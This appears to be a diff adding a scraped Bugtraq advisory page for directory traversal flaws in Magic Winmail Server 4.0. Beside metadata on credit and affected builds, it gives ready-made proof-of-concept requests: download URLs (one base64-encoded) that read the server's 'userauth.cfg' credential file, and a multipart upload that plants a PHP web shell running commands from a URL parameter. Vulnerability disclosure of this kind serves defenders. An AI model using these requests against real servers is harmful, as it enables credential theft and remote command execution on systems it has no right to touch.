@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid12388<p><b><span style="font-size: 18pt;">Magic Winmail Server Multiple Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12388/info">info</a><br><a href="http://www.securityfocus.com/bid/12388/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12388/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12388/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12388/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				12388
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 27 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 27 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of these vulnerabilities is credited to Tan Chew Keong.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					AMAX Information Technologies Inc. Magic Winmail Server 4.0 (Build 1112)<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					AMAX Information Technologies Inc. Magic Winmail Server 4.0 (Build 1318)<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Exploits are not required.<br/><br/>The following proof of concept is available exploiting the download directory traversal vulnerability to attain the 'userauth.cfg' file:<br/><br/>http://www.example.com:6080/download.php?<br/>  sid=656041e927559a2ff&amp; // this must be the current session id <br/>tid=0&amp;folder=INBOX&amp;ix=0&amp;part=1&amp;optype=download&amp;type=nonmime&amp;filename=Ly4uLy4uLy4uLy4uL3VzZXJhdXRoLmNmZw==<br/><br/> // Note Ly4uLy4uLy4uLy4uL3VzZXJhdXRoLmNmZw== is the base64 encoding of /../../../../userauth.cfg<br/><br/>http://www.example.com:6080/download.php?<br/>  sid=656041e927559a2ff&amp;<br/> tid=0&amp;folder=INBOX&amp;ix=0&amp;part=1&amp;optype=download&amp;cache=1&amp;filename=/../../../../userauth.cfg<br/><br/>The following proof of concept is available for the upload directory traversal vulnerability:<br/>-----------------------------31140333525651<br/>Content-Disposition: form-data; name="userfile1"; filename="/../../../a.php"<br/>Content-Type: application/download<br/><br/>&lt;?php<br/>system($_GETcmd);<br/>?&gt;
+	
+		<ul>
+</ul>
+</div>
